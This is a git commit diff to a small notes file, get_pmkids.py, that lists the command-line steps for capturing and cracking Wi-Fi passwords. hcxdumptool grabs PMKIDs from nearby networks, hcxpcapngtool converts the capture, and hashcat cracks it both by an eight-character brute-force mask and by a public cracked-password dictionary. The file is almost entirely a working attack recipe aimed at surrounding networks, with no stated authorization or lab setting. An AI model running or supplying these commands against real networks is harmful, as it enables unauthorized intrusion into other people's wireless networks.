1c97c5b4d421c465acfdd29ba2a56db91946dda5
gerard <12766134+scripting-drafts@users.noreply.github.com>
2024-11-22 14:02:40 +0100

    notes on pmkid

--- aircrack_scripts/get_pmkids.py
+++ aircrack_scripts/get_pmkids.py
@@ -4,8 +4,11 @@
 #   22001 | WPA-PMK-PMKID+EAPOL                                        | Network Protocol
 
 'hcxdumptool -i wlan1 -w nearby_pmkids.pcapng -F rds=1'
-'hcxpcapngtool --pmkid=nearby_pmkids.txt nearby_pmkids.pcapng'
-'hashcat -m 22000 pmkidhashes -a 3 -w 3 ?l?l?l?l?l?l?l?l --session=pmkid'
+'hcxpcapngtool --pmkid=nearby_pmkids.hc22000 nearby_pmkids.pcapng'
+# Bruteforce
+'hashcat -m 22000 nearby_pmkids.hc22000 -a 3 -w 3 ?l?l?l?l?l?l?l?l --session=pmkid'
+# Dictionary - https://wpa-sec.stanev.org/dict/cracked.txt.gz
+'hashcat -m 22000 nearby_pmkids.hc22000 cracked.txt.gz'
 
 # ??? deprecated
 'hcxpmktool -m 88f43854ae7b1624fc2ab7724859e795130f4843c7535729e819cf92f39535dc -e hashcat-essid'
